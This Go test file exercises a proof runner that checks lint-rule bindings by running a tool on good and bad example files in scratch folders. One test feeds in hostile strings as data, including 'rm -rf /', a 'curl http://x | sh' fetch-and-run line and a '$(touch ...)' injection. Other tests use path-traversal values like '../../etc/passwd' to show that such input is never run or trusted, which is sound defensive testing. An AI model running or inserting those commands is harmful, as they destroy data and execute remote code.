package proof_test

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"os"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/birdtable/gragas/internal/core/proof"
	"github.com/birdtable/gragas/internal/model"
	"github.com/birdtable/gragas/internal/model/plugin"
	"github.com/birdtable/gragas/internal/port"
	porttest "github.com/birdtable/gragas/internal/port/testing"
)

// rig is a world with a root, the two folders a batch of one case is run in
// (scratch(1) for the good side, scratch(2) for the bad one), and a plugin's
// findings read of the tool lint at 1.2.3 that answers, for each folder, what
// the test scripted for it.
type rig struct {
	w     *porttest.World
	root  model.Root
	sides map[string]scripted
	// read is the request's findings read: r.scripted, unless a test puts
	// another in its place.
	read proof.Findings
	// calls is every read asked, in order.
	calls []call
}

// scripted is what the read answers in one folder.
type scripted struct {
	side proof.Side
	err  error
}

// call is one read asked: the folder, the job's version and config path, the
// fixtures it was given, and every file the folder held.
type call struct {
	dir, version, config string
	fixtures, files      []string
}

const lintVersion = "1.2.3"

func newRig(t *testing.T) *rig {
	t.Helper()
	w := porttest.NewWorld(t)
	w.Instant(time.Unix(1_700_000_000, 0))
	r := &rig{w: w, root: w.Seed("/proj", map[string]string{"x": "x"}), sides: map[string]scripted{}}
	r.read = r.scripted
	return r
}

// scripted is the fake of the read core/plugins makes over the Steps port: a
// job at a version other than lint's is not on this machine, as the step
// runner answers a pinned tool it does not find; a folder the run did not
// prepare is an error, and so is one nothing was scripted for.
func (r *rig) scripted(_ context.Context, j proof.Job, sc model.Scratch, fixtures []string) (proof.Side, error) {
	files, there := r.w.Scratch(sc)
	r.calls = append(r.calls, call{dir: sc.Dir, version: j.Version, config: j.ConfigPath, fixtures: fixtures, files: files})
	if !there {
		return proof.Side{}, fmt.Errorf("the folder %s was not prepared", sc.Dir)
	}
	if j.Version != lintVersion {
		return proof.Side{}, fmt.Errorf("%w: lint %s", port.ErrStepNotReady, j.Version)
	}
	s, ok := r.sides[sc.Dir]
	if !ok {
		return proof.Side{}, fmt.Errorf("nothing was scripted for %s", sc.Dir)
	}
	return s.side, s.err
}

// script sets what the read answers in the n-th scratch folder.
func (r *rig) script(n int, s proof.Side, err error) { r.sides[scratch(n)] = scripted{s, err} }

// say scripts the tool run once over the n-th folder, exiting 0, and the
// plugin reading out: one finding a line, "key path message".
func (r *rig) say(n int, out string) { r.sayExit(n, 0, out) }

// sayExit is say with the tool exiting code.
func (r *rig) sayExit(n, code int, out string) { r.script(n, sideRan(code, words(out)...), nil) }

// sideRan is a side whose one step ran the tool, exiting code, and whose plugin
// says it ran and read fs.
func sideRan(code int, fs ...plugin.Finding) proof.Side {
	return proof.Side{ToolVersion: lintVersion, Ran: true, Findings: fs,
		Steps: []plugin.Result{{Kind: plugin.KindRun, Exit: &code}}}
}

// words reads one finding a line, "key path message".
func words(out string) []plugin.Finding {
	var fs []plugin.Finding
	for l := range strings.SplitSeq(strings.TrimSpace(out), "\n") {
		f := strings.SplitN(l, " ", 3)
		if len(f) < 2 {
			continue
		}
		d := plugin.Finding{Key: f[0], Path: &f[1]}
		if len(f) == 3 {
			d.Message = f[2]
		}
		fs = append(fs, d)
	}
	return fs
}

func scratch(n int) string { return porttest.ScratchDir(n) }

func theCase(rung model.Rung, at string) proof.Case {
	return proof.Case{Rule: "go.x.1", Pair: proof.Pair{Number: 1,
		Good: proof.Example{Name: "good.go", Data: []byte("ok")}, Bad: proof.Example{Name: "bad.go", Data: []byte("bad")}},
		Binding: model.Binding{Tool: "lint", Target: "code", Key: "no-x", Rung: rung, Pair: 1, PairPath: at}}
}

func (r *rig) run(level model.Level, cases ...proof.Case) ([]model.Cell, error) {
	return proof.Run(context.Background(), r.w.Ports(), r.request(level, cases...))
}

func (r *rig) request(level model.Level, cases ...proof.Case) proof.Request {
	return proof.Request{Root: r.root, Level: level, Findings: r.read,
		Jobs: []proof.Job{{Tool: "lint", Version: lintVersion, Adapter: "1.0.0", Cases: cases}}}
}

// free fails t unless both locks of the root can be taken and put back, as a
// run that ended on any path leaves them.
func (r *rig) free(t *testing.T) {
	t.Helper()
	l := r.w.Ports().Lock
	for _, which := range []model.Lock{model.RootLock, model.ScratchLock} {
		h, err := l.Take(t.Context(), r.root, which)
		if err != nil {
			t.Fatalf("the %s lock is still held: %v", which, err)
		}
		if err := l.Release(h); err != nil {
			t.Fatal(err)
		}
	}
}

// released fails t unless every scratch folder the run made is gone.
func (r *rig) released(t *testing.T, n int) {
	t.Helper()
	for i := 1; i <= n; i++ {
		if _, there := r.w.Scratch(model.Scratch{Dir: scratch(i)}); there {
			t.Errorf("scratch folder %d was not released", i)
		}
	}
}

func TestCellsAreJudgedOnTheBadExampleFlaggedAndTheGoodOneNot(t *testing.T) {
	t.Parallel()
	const flagged = "no-x src/a.go message\n"
	cases := []struct {
		name      string
		good, bad string
		want      model.Truth
	}{
		{"pass", "", flagged, model.TruthPass},
		{"fail, the bad example is not flagged", "", "", model.TruthFail},
		{"fail, the good example is flagged too", flagged, flagged, model.TruthFail},
		{"fail, another entry flagged the bad example", "", "other src/a.go pass\n", model.TruthFail},
		{"pass, a finding at another file is not this binding's", "no-x src/b.go\n", flagged, model.TruthPass},
		{"pass, the text of a finding is never read", "", "no-x src/a.go fail fail fail\n", model.TruthPass},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			r := newRig(t)
			r.say(1, c.good)
			r.say(2, c.bad)
			one := theCase(3, "src/a.go")
			got, err := r.run(model.Isolated, one)
			if err != nil || len(got) != 1 {
				t.Fatalf("Run = %v, %v, want one cell", got, err)
			}
			// The cell carries its tool and what it was proven on, which a later Plan compares.
			inputs := proof.Inputs(r.request(model.Isolated, one).Jobs[0], one)
			want := model.Cell{Binding: got[0].Binding, ToolVersion: lintVersion, Result: c.want, Rung: 3, Level: model.RunPair, Adapter: "1.0.0", Tool: "lint", Inputs: inputs}
			if got[0] != want || !strings.HasPrefix(got[0].Binding, "go.x.1#") {
				t.Errorf("cell = %+v, want %+v", got[0], want)
			}
			r.free(t)
			r.released(t, 2)
		})
	}
}

func TestACellThatIsNotRunSaysWhy(t *testing.T) {
	t.Parallel()
	t.Run("a binding with no pair path is not run, no pair", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		got, err := r.run(model.Isolated, theCase(3, ""))
		if err != nil || got[0].Result != model.TruthNotRun || got[0].Reason != model.ReasonNoPair {
			t.Errorf("Run = %+v, %v, want not run, no pair", got, err)
		}
		if len(r.w.Prepared) != 0 {
			t.Errorf("a folder was prepared for a cell with no pair: %v", r.w.Prepared)
		}
	})
	t.Run("a rung-6 binding is reviewed and nothing runs", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		got, err := r.run(model.Isolated, theCase(model.MaxRung, "src/a.go"))
		if err != nil || got[0].Result != model.TruthReviewed || got[0].Reason != "" || len(r.w.Prepared) != 0 {
			t.Errorf("Run = %+v, %v, prepared %d, want reviewed with no run", got, err, len(r.w.Prepared))
		}
	})
	t.Run("a tool that is nowhere at the version is not run, tool missing, and the next job runs", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		// The job that is not here takes the first folder and gives it back;
		// the next job runs in the two after it.
		r.say(2, "")
		r.say(3, "no-x src/a.go\n")
		req := r.request(model.Isolated, theCase(3, "src/a.go"))
		gone := req.Jobs[0]
		gone.Version = "9.9.9"
		req.Jobs = []proof.Job{gone, req.Jobs[0]}
		got, err := proof.Run(t.Context(), r.w.Ports(), req)
		if err != nil || len(got) != 2 {
			t.Fatalf("Run = %v, %v, want two cells", got, err)
		}
		if got[0].Result != model.TruthNotRun || got[0].Reason != model.ReasonToolMissing || got[1].Result != model.TruthPass {
			t.Errorf("cells = %+v, want not run, tool missing, then pass", got)
		}
		if len(r.calls) != 3 {
			t.Errorf("%d reads, want 3: the missing job's good side only, then both sides of the next", len(r.calls))
		}
		r.free(t)
		r.released(t, 3)
	})
	t.Run("a tool found at another version than the job's is not run, tool missing, and no later batch is read", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		other := sideRan(0)
		other.ToolVersion = "1.2.4"
		r.script(1, other, nil)
		// Two cells at one path are two batches.
		got, err := r.run(model.Isolated, theCase(3, "src/a.go"), theCase(3, "src/a.go"))
		if err != nil || len(got) != 2 {
			t.Fatalf("Run = %v, %v, want two cells", got, err)
		}
		for _, c := range got {
			if c.Result != model.TruthNotRun || c.Reason != model.ReasonToolMissing {
				t.Errorf("cell = %+v, want not run, tool missing", c)
			}
		}
		if len(r.calls) != 1 {
			t.Errorf("%d reads, want 1", len(r.calls))
		}
		r.free(t)
		r.released(t, 1)
	})
	t.Run("a bad side that finds the tool at another version stops the later batches too", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.say(1, "")
		other := sideRan(0)
		other.ToolVersion = "1.2.4"
		r.script(2, other, nil)
		got, err := r.run(model.Isolated, theCase(3, "src/a.go"), theCase(3, "src/a.go"))
		if err != nil || len(got) != 2 {
			t.Fatalf("Run = %v, %v, want two cells", got, err)
		}
		for _, c := range got {
			if c.Result != model.TruthNotRun || c.Reason != model.ReasonToolMissing {
				t.Errorf("cell = %+v, want not run, tool missing", c)
			}
		}
		if len(r.calls) != 2 {
			t.Errorf("%d reads, want 2: both sides of the first batch only", len(r.calls))
		}
		r.free(t)
		r.released(t, 2)
	})
}

type limitErr struct{}

func (limitErr) Error() string          { return "the deadline passed" }
func (limitErr) NotRun() (string, bool) { return "not run: the deadline was hit", true }

// limited is read, answering every side with an error that says a limit was
// hit when hit is set.
func limited(read proof.Findings, hit bool) proof.Findings {
	return func(ctx context.Context, j proof.Job, sc model.Scratch, fixtures []string) (proof.Side, error) {
		if hit {
			return proof.Side{}, limitErr{}
		}
		return read(ctx, j, sc, fixtures)
	}
}

func TestALimitHitIsNotRunAndAnyOtherToolErrorRefusesTheRun(t *testing.T) {
	t.Parallel()
	for _, hit := range []bool{true, false} {
		r := newRig(t)
		r.say(1, "")
		r.say(2, "no-x src/a.go\n")
		req := r.request(model.Isolated, theCase(3, "src/a.go"))
		req.Findings = limited(req.Findings, hit)
		got, err := proof.Run(t.Context(), r.w.Ports(), req)
		switch {
		case hit && (err != nil || got[0].Result != model.TruthNotRun || got[0].Reason != model.ReasonLimitHit):
			t.Errorf("limit hit: Run = %+v, %v, want not run, limit hit", got, err)
		case !hit && (err != nil || got[0].Result != model.TruthPass):
			t.Errorf("control: Run = %+v, %v, want pass", got, err)
		}
		r.free(t)
		r.released(t, 2)
	}
	t.Run("an error of the read that is no limit refuses the run", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.script(1, proof.Side{}, errors.New("the plugin answered no document"))
		if got, err := r.run(model.Isolated, theCase(3, "src/a.go")); err == nil || got != nil {
			t.Errorf("Run = %+v, %v, want the error and no cell", got, err)
		}
		r.free(t)
		r.released(t, 1)
	})
}

func TestALowerLevelRefusesTheRunBeforeTheToolIsCalled(t *testing.T) {
	t.Parallel()
	t.Run("the sandbox reached a lower level", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.w.SandboxReaches(model.Sandboxed, model.Isolated)
		got, err := r.run(model.Sandboxed, theCase(3, "src/a.go"))
		if !errors.Is(err, proof.ErrLevel) || got != nil || len(r.calls) != 0 {
			t.Errorf("Run = %+v, %v, reads %d, want ErrLevel, no cell and no read", got, err, len(r.calls))
		}
		r.free(t)
		r.released(t, 1)
	})
	t.Run("the platform has no sandbox: the cell is not run, sandbox missing, and the hint is the sandbox's own line", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.w.SandboxMissing(model.Sandboxed)
		var hints []string
		req := r.request(model.Sandboxed, theCase(3, "src/a.go"), theCase(3, "src/b.go"))
		req.Hint = func(l string) { hints = append(hints, l) }
		got, err := proof.Run(t.Context(), r.w.Ports(), req)
		if err != nil || len(got) != 2 || len(r.calls) != 0 {
			t.Fatalf("Run = %+v, %v, reads %d, want two cells, no error and no read", got, err, len(r.calls))
		}
		for _, c := range got {
			if c.Result != model.TruthNotRun || c.Reason != model.ReasonSandboxMissing {
				t.Errorf("cell = %+v, want not run, sandbox missing", c)
			}
		}
		if len(hints) != 1 || hints[0] == "" {
			t.Errorf("hints = %q, want the sandbox's line once", hints)
		}
		r.free(t)
		r.released(t, 2)
	})
	t.Run("an isolated run on a platform with no isolation is still refused", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.w.SandboxMissing(model.Isolated)
		if _, err := r.run(model.Isolated, theCase(3, "src/a.go")); !errors.Is(err, proof.ErrLevel) || !errors.Is(err, port.ErrUnavailable) || len(r.calls) != 0 {
			t.Errorf("Run error = %v, reads %d, want ErrLevel over ErrUnavailable and no read", err, len(r.calls))
		}
		r.free(t)
	})
	t.Run("control: a level reached is run", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.say(1, "")
		r.say(2, "no-x src/a.go\n")
		if got, err := r.run(model.Sandboxed, theCase(3, "src/a.go")); err != nil || got[0].Result != model.TruthPass {
			t.Errorf("Run = %+v, %v, want pass", got, err)
		}
	})
}

func TestOutputThatCannotBeTrustedRefusesTheWholeBatch(t *testing.T) {
	t.Parallel()
	bad := map[string]string{
		"a finding that climbs":                 "no-x ../../etc/passwd\n",
		"a finding at an absolute path outside": "no-x /work/scratch/passwd\n",
	}
	for _, p := range foreignPaths(t) {
		bad["a finding at the foreign path "+p] = "no-x " + p + "\n"
	}
	for name, out := range bad {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			r := newRig(t)
			r.say(1, "")
			r.say(2, out)
			got, err := r.run(model.Isolated, theCase(3, "src/a.go"))
			if !errors.Is(err, proof.ErrOutput) || got != nil {
				t.Errorf("Run = %+v, %v, want ErrOutput and no cell", got, err)
			}
			r.free(t)
			r.released(t, 2)
		})
	}
	t.Run("a finding at an empty path is refused", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.say(1, "")
		empty := ""
		r.script(2, sideRan(0, plugin.Finding{Key: "no-x", Path: &empty}), nil)
		if _, err := r.run(model.Isolated, theCase(3, "src/a.go")); !errors.Is(err, proof.ErrOutput) {
			t.Errorf("Run error = %v, want ErrOutput", err)
		}
	})
	t.Run("control: a finding at the folder's own absolute path is the placed file's", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.say(1, "")
		r.say(2, "no-x "+scratch(2)+"/src/a.go\n")
		if got, err := r.run(model.Isolated, theCase(3, "src/a.go")); err != nil || got[0].Result != model.TruthPass {
			t.Errorf("Run = %+v, %v, want pass", got, err)
		}
	})
	t.Run("control: a finding that names no file is left out, and flags nothing", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.script(1, sideRan(0, plugin.Finding{Key: "no-x"}), nil)
		r.say(2, "no-x src/a.go\n")
		if got, err := r.run(model.Isolated, theCase(3, "src/a.go")); err != nil || got[0].Result != model.TruthPass {
			t.Errorf("Run = %+v, %v, want pass", got, err)
		}
	})
}

// TestASideThePluginCannotVouchForRefusesTheBatch: the engine holds a side
// only to what is free of format (gates.plants.1). Which codes of the tool
// mean it ran, and which findings are its own failure, are the plugin's to
// say, in Ran; a step cut at the cap, a read that ran no step of the tool, and
// a run that failed with nothing read are refused whatever the plugin says.
// Planted: each refusal on the good side, where a lax check would let the
// binding pass, and on the bad side, which is flagged.
func TestASideThePluginCannotVouchForRefusesTheBatch(t *testing.T) {
	t.Parallel()
	cut := true
	sides := map[string]func() proof.Side{
		"the plugin says the tool did not run": func() proof.Side {
			s := sideRan(1, words("no-x src/a.go\n")...)
			s.Ran, s.Why = false, "the config was rejected"
			return s
		},
		"a step's output was cut at the cap": func() proof.Side {
			s := sideRan(0, words("no-x src/a.go\n")...)
			s.Steps[0].Cut = &cut
			return s
		},
		"the read ran no step of the tool": func() proof.Side {
			s := sideRan(0, words("no-x src/a.go\n")...)
			s.Steps[0].Kind, s.Steps[0].Exit = plugin.KindRead, nil
			return s
		},
		"the read ran no step at all": func() proof.Side {
			s := sideRan(0, words("no-x src/a.go\n")...)
			s.Steps = nil
			return s
		},
	}
	for name, side := range sides {
		for n, where := range map[int]string{1: "good", 2: "bad"} {
			t.Run(name+", on the "+where+" side", func(t *testing.T) {
				t.Parallel()
				r := newRig(t)
				r.say(1, "")
				r.say(2, "no-x src/a.go\n")
				s := side()
				if n == 1 {
					s.Findings = nil
				}
				r.script(n, s, nil)
				got, err := r.run(model.Isolated, theCase(3, "src/a.go"))
				if !errors.Is(err, proof.ErrOutput) || got != nil {
					t.Errorf("Run = %+v, %v, want ErrOutput and no cell", got, err)
				}
				r.free(t)
				r.released(t, 2)
			})
		}
	}
	t.Run("control: a good side the tool exited 1 on with another rule's finding still passes", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.sayExit(1, 1, "other-rule src/a.go\n")
		r.sayExit(2, 1, "no-x src/a.go\n")
		if got, err := r.run(model.Isolated, theCase(3, "src/a.go")); err != nil || got[0].Result != model.TruthPass {
			t.Errorf("Run = %+v, %v, want pass", got, err)
		}
	})
	t.Run("control: a read that read a file before it ran the tool passes", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.say(1, "")
		s := sideRan(0, words("no-x src/a.go\n")...)
		s.Steps = append([]plugin.Result{{Kind: plugin.KindRead}}, s.Steps...)
		r.script(2, s, nil)
		if got, err := r.run(model.Isolated, theCase(3, "src/a.go")); err != nil || got[0].Result != model.TruthPass {
			t.Errorf("Run = %+v, %v, want pass", got, err)
		}
	})
}

func TestAPairPathThatClimbsIsRefusedBeforeAnyFolderIsMade(t *testing.T) {
	t.Parallel()
	r := newRig(t)
	if _, err := r.run(model.Isolated, theCase(3, "../x.go")); !errors.Is(err, proof.ErrPath) || len(r.w.Prepared) != 0 || len(r.calls) != 0 {
		t.Errorf("Run error = %v, prepared %d, reads %d, want ErrPath and nothing made", err, len(r.w.Prepared), len(r.calls))
	}
	r.free(t)
}

func TestTextInAnExampleOrAFindingIsNeverRun(t *testing.T) {
	t.Parallel()
	r := newRig(t)
	r.say(1, "no-x src/a.go rm -rf / ; curl http://x | sh\n")
	r.say(2, "no-x src/a.go $(touch /work/scratch/pwned)\n")
	c := theCase(3, "src/a.go")
	c.Pair.Bad.Data = []byte("#!sh\nrm -rf /\n")
	if _, err := r.run(model.Isolated, c); err != nil {
		t.Fatal(err)
	}
	if len(r.calls) != 2 {
		t.Fatalf("%d reads, want 2: one a side", len(r.calls))
	}
	for n, got := range r.calls {
		if got.dir != scratch(n+1) || got.version != lintVersion || got.config != "" || !slices.Equal(got.fixtures, []string{"src/a.go"}) {
			t.Errorf("read %d = %+v, want the one read of the placed example in its own folder", n+1, got)
		}
	}
}

func TestOneProcessASideUntilTwoCellsShareAPath(t *testing.T) {
	t.Parallel()
	count := func(t *testing.T, at ...string) int {
		t.Helper()
		r := newRig(t)
		for n := 1; n <= 2*len(at); n++ {
			r.say(n, "")
		}
		var cs []proof.Case
		for _, p := range at {
			cs = append(cs, theCase(3, p))
		}
		got, err := r.run(model.Isolated, cs...)
		if err != nil || len(got) != len(at) {
			t.Fatalf("Run = %v, %v", got, err)
		}
		return len(r.calls)
	}
	if n := count(t, "a/x.go", "b/x.go", "c/x.go"); n != 2 {
		t.Errorf("three cells at three paths ran %d reads, want 2", n)
	}
	if n := count(t, "a/x.go", "a/x.go"); n != 4 {
		t.Errorf("two cells at one path ran %d reads, want 4", n)
	}
	if n := count(t, "a", "a/x.go"); n != 4 {
		t.Errorf("a file and a file below it ran %d reads, want 4", n)
	}
}

func TestAnotherProofRunHoldingTheScratchLockEndsBusyAndReleasesTheRootLock(t *testing.T) {
	t.Parallel()
	r := newRig(t)
	r.w.HoldLock(r.root, model.ScratchLock, 1)
	got, err := r.run(model.Isolated, theCase(3, "src/a.go"))
	if !errors.Is(err, port.ErrHeld) || got != nil || len(r.w.Prepared) != 0 || len(r.calls) != 0 {
		t.Errorf("Run = %+v, %v, want ErrHeld and nothing made", got, err)
	}
	h, terr := r.w.Ports().Lock.Take(t.Context(), r.root, model.RootLock)
	if terr != nil {
		t.Fatalf("the root lock was left held: %v", terr)
	}
	if err := r.w.Ports().Lock.Release(h); err != nil {
		t.Fatal(err)
	}
}

func TestACancelledRunLeavesNothingHeldOrMade(t *testing.T) {
	t.Parallel()
	r := newRig(t)
	ctx, cancel := context.WithCancel(t.Context())
	cancel()
	if _, err := proof.Run(ctx, r.w.Ports(), r.request(model.Isolated, theCase(3, "src/a.go"))); !errors.Is(err, context.Canceled) {
		t.Errorf("Run error = %v, want the cancellation", err)
	}
	if len(r.w.Prepared) != 0 || len(r.calls) != 0 {
		t.Errorf("a cancelled run made %d folders and %d reads", len(r.w.Prepared), len(r.calls))
	}
	r.free(t)
}

// displayOnly is every field of a finding the judge may not read.
func displayOnly() []string { return []string{"Message", "URL", "Line", "Column", "Severity"} }

// reads is each place src selects one of the fields.
func reads(t *testing.T, name, src string) []string {
	t.Helper()
	file, err := parser.ParseFile(token.NewFileSet(), name, src, parser.SkipObjectResolution)
	if err != nil {
		t.Fatal(err)
	}
	var hits []string
	ast.Inspect(file, func(n ast.Node) bool {
		if s, ok := n.(*ast.SelectorExpr); ok {
			for _, f := range displayOnly() {
				if s.Sel.Name == f {
					hits = append(hits, name+": ."+f)
				}
			}
		}
		return true
	})
	return hits
}

// TestTheJudgeReadsNoDisplayOnlyField: a tool's text decides nothing
// (arch.ports.19). Planted: a read of the message is found; the control, a
// read of the key, is not.
func TestTheJudgeReadsNoDisplayOnlyField(t *testing.T) {
	t.Parallel()
	if got := reads(t, "planted.go", "package p\nfunc f(d D) bool { return d.Message == \"pass\" }"); len(got) != 1 {
		t.Fatalf("a planted read of the message was found %d times, want 1", len(got))
	}
	if got := reads(t, "control.go", "package p\nfunc f(d D) bool { return d.Key == \"pass\" }"); len(got) != 0 {
		t.Fatalf("control found %v", got)
	}
	for _, f := range []string{"run.go", "judge.go"} {
		src, err := os.ReadFile(f)
		if err != nil {
			t.Fatal(err)
		}
		if got := reads(t, f, string(src)); len(got) != 0 {
			t.Errorf("%v: the proof run reads a field that is display only", got)
		}
	}
}

// FuzzRunPaths holds the mapping of a finding's path: whatever a plugin
// reads as a path, the run ends in a cell of pass or fail, or is refused with
// ErrOutput, and never leaves a folder or a lock behind.
func FuzzRunPaths(f *testing.F) {
	for _, s := range []string{"src/a.go", "../x", scratch(2) + "/src/a.go", "/work/scratch/passwd", "", "./src/a.go", "src//a.go", "src/a.go/..", "a\x00b"} {
		f.Add(s)
	}
	for _, s := range foreignPaths(f) {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, p string) {
		r := newRig(t)
		req := r.request(model.Isolated, theCase(3, "src/a.go"))
		req.Findings = func(context.Context, proof.Job, model.Scratch, []string) (proof.Side, error) {
			return sideRan(0, plugin.Finding{Key: "no-x", Path: &p}), nil
		}
		got, err := proof.Run(t.Context(), r.w.Ports(), req)
		switch {
		case err == nil && len(got) == 1 && (got[0].Result == model.TruthPass || got[0].Result == model.TruthFail):
		case errors.Is(err, proof.ErrOutput) && got == nil:
		default:
			t.Fatalf("Run(%q) = %+v, %v", p, got, err)
		}
		if err == nil && got[0].Result == model.TruthPass && p != "src/a.go" && p != "./src/a.go" && p != scratch(2)+"/src/a.go" {
			t.Fatalf("a finding at %q proved src/a.go", p)
		}
		r.free(t)
		r.released(t, 2)
	})
}

func TestAConfigPathIsAFileOfTheConfigSetOrTheRunIsRefusedBeforeTheTool(t *testing.T) {
	t.Parallel()
	cfg := []model.File{{Path: "lint.cfg", Data: []byte("c")}}
	for name, path := range map[string]string{
		"a path that climbs":            "../../x",
		"an absolute path":              "/work/scratch/x",
		"a path that is no config file": "other.cfg",
		"an unclean path":               "./lint.cfg",
	} {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			r := newRig(t)
			req := r.request(model.Isolated, theCase(3, "src/a.go"))
			req.Jobs[0].Config, req.Jobs[0].ConfigPath = cfg, path
			got, err := proof.Run(context.Background(), r.w.Ports(), req)
			if !errors.Is(err, proof.ErrPath) || got != nil {
				t.Errorf("Run = %+v, %v, want ErrPath and no cell", got, err)
			}
			if len(r.w.Prepared) != 0 || len(r.calls) != 0 {
				t.Errorf("a folder was prepared or read before the config path was checked: %v, %d reads", r.w.Prepared, len(r.calls))
			}
			r.free(t)
		})
	}
	t.Run("control: a file of the config set is given to the read, in the folder, and is no fixture", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.say(1, "")
		r.say(2, "no-x src/a.go\n")
		req := r.request(model.Isolated, theCase(3, "src/a.go"))
		req.Jobs[0].Config, req.Jobs[0].ConfigPath = cfg, "lint.cfg"
		if got, err := proof.Run(context.Background(), r.w.Ports(), req); err != nil || got[0].Result != model.TruthPass {
			t.Errorf("Run = %+v, %v, want pass", got, err)
		}
		for _, got := range r.calls {
			if got.config != "lint.cfg" || !slices.Contains(got.files, "lint.cfg") || !slices.Equal(got.fixtures, []string{"src/a.go"}) {
				t.Errorf("read %+v, want config lint.cfg in the folder and the one fixture src/a.go", got)
			}
		}
	})
}

func TestASideThatFailedAndSaidNothingIsNotCleanAndRefusesTheBatch(t *testing.T) {
	t.Parallel()
	t.Run("a good example the tool crashed on does not pass the binding", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.sayExit(1, 2, "")
		r.say(2, "no-x src/a.go\n")
		got, err := r.run(model.Isolated, theCase(3, "src/a.go"))
		if !errors.Is(err, proof.ErrOutput) || got != nil {
			t.Errorf("Run = %+v, %v, want ErrOutput and no cell", got, err)
		}
		r.free(t)
		r.released(t, 2)
	})
	t.Run("a bad side that failed and said nothing is refused too", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.say(1, "")
		r.sayExit(2, 1, "")
		if _, err := r.run(model.Isolated, theCase(3, "src/a.go")); !errors.Is(err, proof.ErrOutput) {
			t.Errorf("Run error = %v, want ErrOutput", err)
		}
	})
	// A finding that names no file is left out by within, so it is not a
	// reading either: a crash the plugin reads as one pathless finding (the
	// tool's own "internal error") is still a crash.
	t.Run("a good side that crashed with only a pathless finding does not pass the binding", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.script(1, sideRan(2, plugin.Finding{Key: "internal-error"}), nil)
		r.say(2, "no-x src/a.go\n")
		got, err := r.run(model.Isolated, theCase(3, "src/a.go"))
		if !errors.Is(err, proof.ErrOutput) || got != nil {
			t.Errorf("Run = %+v, %v, want ErrOutput and no cell", got, err)
		}
		r.free(t)
		r.released(t, 2)
	})
	t.Run("a bad side that failed with only a pathless finding is refused too", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.say(1, "")
		r.script(2, sideRan(1, plugin.Finding{Key: "no-x"}), nil)
		if _, err := r.run(model.Isolated, theCase(3, "src/a.go")); !errors.Is(err, proof.ErrOutput) {
			t.Errorf("Run error = %v, want ErrOutput", err)
		}
	})
	t.Run("control: a tool that exits non-zero because it flagged the bad example still passes", func(t *testing.T) {
		t.Parallel()
		r := newRig(t)
		r.say(1, "")
		r.sayExit(2, 1, "no-x src/a.go\n")
		if got, err := r.run(model.Isolated, theCase(3, "src/a.go")); err != nil || got[0].Result != model.TruthPass {
			t.Errorf("Run = %+v, %v, want pass", got, err)
		}
	})
}

// refuse scripts the step runner refusing the run in the n-th scratch folder
// before it starts, with the words a platform that cannot judge memory uses.
func (r *rig) refuse(n int, why string) {
	r.script(n, proof.Side{}, fmt.Errorf("%w: %s", port.ErrRefused, why))
}

const memoryWhy = "this platform gives no reading of a run's peak memory, so a memory limit cannot be held, so it is not run"

// recordsOf is every record of the journal of the rig's root.
func (r *rig) recordsOf(t *testing.T) []model.Record {
	t.Helper()
	recs, torn, err := r.w.Ports().Journal.Records(t.Context(), r.root)
	if err != nil || torn != 0 {
		t.Fatalf("Records = %v, torn %d", err, torn)
	}
	return recs
}

// TestAToolRunTheStepRunnerRefusesLeavesOneJournalRecordNamingIt: a run held
// to a memory limit on a platform that cannot judge it ends refused, as
// before, and the journal holds one close record under the run's id, its
// outcome refused, with the tool, its version and the refusal's text. Risk: a
// refused run that leaves no trace for a person to read.
// Planted: no record written.
func TestAToolRunTheStepRunnerRefusesLeavesOneJournalRecordNamingIt(t *testing.T) {
	t.Parallel()
	r := newRig(t)
	r.refuse(1, memoryWhy)
	req := r.request(model.Isolated, theCase(3, "src/a.go"))
	req.Run, req.Engine = "prove-7", "0.9.0"
	got, err := proof.Run(t.Context(), r.w.Ports(), req)
	if !errors.Is(err, port.ErrRefused) || got != nil || !strings.Contains(err.Error(), memoryWhy) {
		t.Fatalf("Run = %+v, %v, want no cell and the refusal, whole", got, err)
	}
	recs := r.recordsOf(t)
	if len(recs) != 1 {
		t.Fatalf("the journal holds %d records, want one: %+v", len(recs), recs)
	}
	rec := recs[0]
	if rec.Run != "prove-7" || rec.Kind != model.KindClose || rec.Command != "prove" || rec.Engine != "0.9.0" {
		t.Errorf("record %+v, want a close of run prove-7 by prove, written by engine 0.9.0", rec)
	}
	var detail struct{ Outcome, Cause, Tool, Version, Why string }
	if err := json.Unmarshal(rec.Detail, &detail); err != nil {
		t.Fatal(err)
	}
	if want := (struct{ Outcome, Cause, Tool, Version, Why string }{"refused", "tool refused", "lint", lintVersion, detail.Why}); detail != want || !strings.Contains(detail.Why, memoryWhy) {
		t.Errorf("detail %+v, want the refusal, the tool lint %s and the text %q", detail, lintVersion, memoryWhy)
	}
	r.free(t)
	r.released(t, 1)
}

// olderJournal is a journal whose every append is refused as host/fs
// refuses one over a journal of an older form, with the model's error that
// names the line, the run, the journal and the fix.
type olderJournal struct{ port.Journal }

func (olderJournal) Append(context.Context, model.Root, model.Record) error {
	return fmt.Errorf("journal append: %w", &model.OlderJournalError{Line: 1, Run: "r1", Path: "/state/aa.journal"})
}

